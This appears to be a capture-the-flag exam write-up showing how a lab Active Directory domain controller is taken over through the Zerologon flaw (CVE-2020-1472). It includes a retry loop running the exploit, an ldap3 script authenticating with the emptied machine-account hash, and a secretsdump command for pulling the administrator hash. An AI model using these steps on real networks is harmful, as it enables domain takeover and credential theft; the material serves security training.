\# Task 3 — Windows / Active Directory



\*\*CyberEd Portal — HackCamp 2026 Penetration Testing Exam\*\*



| Information           | Details                                                           |

| --------------------- | ----------------------------------------------------------------- |

| \*\*Task\*\*              | 3 — Windows                                                       |

| \*\*Difficulty\*\*        | Medium                                                            |

| \*\*Objective\*\*         | Hack the host and find the flag stored in a user's LDAP attribute |

| \*\*Target\*\*            | `<TARGET\_IP>`                                                     |

| \*\*Domain\*\*            | `sandbox.local`                                                   |

| \*\*Domain Controller\*\* | `DC1.sandbox.local`                                               |

| \*\*Group\*\*             | 362                                                               |



\---



\## Attack Chain



```text

Domain Controller

&#x20;       ↓

Zerologon

CVE-2020-1472

&#x20;       ↓

DC1$ machine account

&#x20;       ↓

Empty machine-account password

&#x20;       ↓

NTLM authentication

&#x20;       ↓

LDAP query

&#x20;       ↓

User description attribute

&#x20;       ↓

FLAG

```



\---



\# 1. Reconnaissance



The first step was to determine what services were exposed on the target.



```bash

nmap -Pn -p- --min-rate 3000 <TARGET\_IP>

```



The scan revealed several services commonly associated with a Windows Domain Controller, including:



```text

53       DNS

88       Kerberos

135      RPC

139      NetBIOS

389      LDAP

445      SMB

636      LDAPS

3268     Global Catalog

5985     WinRM

9389     Active Directory Web Services

```



This strongly indicated that the target was an Active Directory Domain Controller.



\---



\# 2. LDAP Enumeration



I queried the LDAP root information to identify the domain.



```bash

ldapsearch -x \\

\-H ldap://<TARGET\_IP> \\

\-s base \\

\-b "" \\

namingContexts defaultNamingContext dnsHostName

```



The response revealed:



```text

defaultNamingContext: DC=sandbox,DC=local

dnsHostName: DC1.sandbox.local

```



Therefore:



```text

Domain: sandbox.local

Domain Controller: DC1.sandbox.local

```



Anonymous LDAP object reads were blocked and required authentication.



\---



\# 3. Additional Enumeration



SAMR/RID enumeration was restricted by the target configuration.



Guest access was also disabled.



Kerberos-based user enumeration was possible but the environment heavily rate-limited requests.



A single-threaded approach was more reliable:



```bash

kerbrute -t 1 ...

```



However, user enumeration was ultimately unnecessary because the intended attack path was \*\*Zerologon\*\*.



\---



\# 4. Exploiting Zerologon — CVE-2020-1472



The Domain Controller was vulnerable to:



\*\*CVE-2020-1472 — Zerologon\*\*



Zerologon is a vulnerability in the Netlogon Remote Protocol that can allow an attacker to compromise the machine account of a vulnerable Domain Controller.



The exploit used was:



```text

CVE-2020-1472

```



The exploit repository used during the lab was:



```text

dirkjanm/CVE-2020-1472

```



The exploit was configured against the Domain Controller:



```text

DC1

```



and the current target IP.



\---



\# 5. VPN Reliability Issue



The VPN connection was extremely unreliable during the exam, with significant packet loss.



Two important adjustments were required.



\### 5.1 Bypass the Endpoint Mapper



The original exploit attempted to use the RPC endpoint mapper on port 135.



Because of the packet loss, communication through port 135 was unreliable.



The exploit was modified to use the Netlogon SMB named pipe over port 445:



```text

ncacn\_np:<TARGET\_IP>\[\\pipe\\netlogon]

```



A longer connection timeout was also configured.



\### 5.2 Retry the Exploit



The exploit was executed repeatedly so that TCP retransmissions could eventually succeed:



```bash

IP=<TARGET\_IP>



for i in $(seq 1 40); do

&#x20;   echo "try $i"

&#x20;   timeout 320 python3 \~/Downloads/cve-2020-1472-exploit.py DC1 $IP \&\& break

done

```



The successful execution reported:



```text

Target vulnerable, changing account password to empty string

```



followed by:



```text

Result: 0

Exploit complete!

```



The machine account password was therefore successfully changed to an empty password.



\---



\# 6. Empty Machine Account Hash



After the Zerologon attack, the empty NT hash for the machine account was:



```text

31d6cfe0d16ae931b73c59d7e0c089c0

```



The machine account was:



```text

DC1$

```



This allowed authentication using the compromised machine account.



\---



\# 7. Reading the Flag Through LDAP



Instead of performing a noisy DCSync operation, I used the compromised machine account to authenticate to LDAP and query user attributes directly.



The LDAP query searched for entries containing descriptions:



```text

(description=\*)

```



and requested:



```text

sAMAccountName

description

info

comment

```



The important part of the Python script was:



```python

from ldap3 import Server, Connection, NTLM, SUBTREE, NONE



server = Server(

&#x20;   ip,

&#x20;   get\_info=NONE,

&#x20;   connect\_timeout=90

)



conn = Connection(

&#x20;   server,

&#x20;   user=r'SANDBOX\\DC1$',

&#x20;   password='aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0',

&#x20;   authentication=NTLM,

&#x20;   auto\_bind=True,

&#x20;   receive\_timeout=90

)



conn.search(

&#x20;   'DC=sandbox,DC=local',

&#x20;   '(description=\*)',

&#x20;   SUBTREE,

&#x20;   attributes=\[

&#x20;       'sAMAccountName',

&#x20;       'description',

&#x20;       'info',

&#x20;       'comment'

&#x20;   ]

)

```



\### Important Optimization



Using:



```python

Server(ip, get\_info=NONE)

```



was critical.



Using `get\_info=ALL` caused `ldap3` to download a large amount of Active Directory schema information during the connection.



Because of the lossy VPN, this repeatedly timed out.



Using:



```python

get\_info=NONE

```



reduced the operation to the required authentication and LDAP query.



\---



\# 8. Flag Location



The LDAP query returned a user entry containing the flag in the `description` attribute.



The relevant entry was:



```text

CN=JONAS\_CARTER,

OU=ServiceAccounts,

OU=GOO,

OU=Tier 2,

DC=sandbox,

DC=local

```



The description contained:



```text

cybered{YOUR\_FLAG\_HERE}

```



Therefore, the flag was stored in:



```text

JONAS\_CARTER.description

```



\---



\# 9. Alternative Approach



If reading the user descriptions directly with the `DC1$` account was not permitted, an alternative was to use the compromised machine account for DCSync and retrieve the Administrator NT hash.



For example:



```bash

impacket-secretsdump \\

\-just-dc-user administrator \\

\-hashes ':31d6cfe0d16ae931b73c59d7e0c089c0' \\

'sandbox.local/DC1$@<TARGET\_IP>'

```



The recovered administrator hash could then be used to authenticate and perform the LDAP query.



This alternative was not required for the successful path.



\---



\# 10. Flag



```text

cybered{YOUR\_FLAG\_HERE}

```



> Replace `YOUR\_FLAG\_HERE` with the flag from your exam deployment if publication is permitted.



\---



\# 11. Lessons Learned



\### Active Directory Reconnaissance



\* Multiple exposed services can quickly identify a Domain Controller.

\* LDAP root queries are useful for discovering the domain naming context.

\* Kerberos, LDAP, SMB, and RPC should be considered together when assessing an AD environment.



\### Zerologon



\* CVE-2020-1472 can compromise a vulnerable Domain Controller's machine account.

\* Network reliability can significantly affect RPC-based exploitation.

\* Using the Netlogon named pipe over SMB was more reliable than relying on the endpoint mapper in this environment.



\### LDAP



\* A machine account can provide useful directory access after successful authentication.

\* LDAP can expose attributes such as `description`, `info`, and `comment`.

\* Minimizing LDAP queries is important when working over an unreliable network.



\### Troubleshooting



\* Increase connection timeouts when packet loss is high.

\* Retry operations that depend on unreliable network connections.

\* Avoid unnecessarily large LDAP operations.

\* `get\_info=NONE` significantly reduced LDAP connection overhead.



\---



\# 12. Final Attack Path



```text

AD Domain Controller

&#x20;       │

&#x20;       ▼

Reconnaissance

&#x20;       │

&#x20;       ▼

Identify sandbox.local / DC1

&#x20;       │

&#x20;       ▼

CVE-2020-1472 Zerologon

&#x20;       │

&#x20;       ▼

Compromise DC1$ machine account

&#x20;       │

&#x20;       ▼

Empty machine-account password

&#x20;       │

&#x20;       ▼

NTLM authentication

&#x20;       │

&#x20;       ▼

LDAP search

&#x20;       │

&#x20;       ▼

JONAS\_CARTER.description

&#x20;       │

&#x20;       ▼

FLAG

```



\---



\## Conclusion



The challenge was solved by combining Active Directory reconnaissance, exploitation of Zerologon, NTLM authentication using the compromised `DC1$` machine account, and a targeted LDAP query to retrieve the flag from a user's `description` attribute.



The most important practical lesson was adapting the exploitation strategy to the unreliable VPN by minimizing network traffic, increasing timeouts, and using retries.



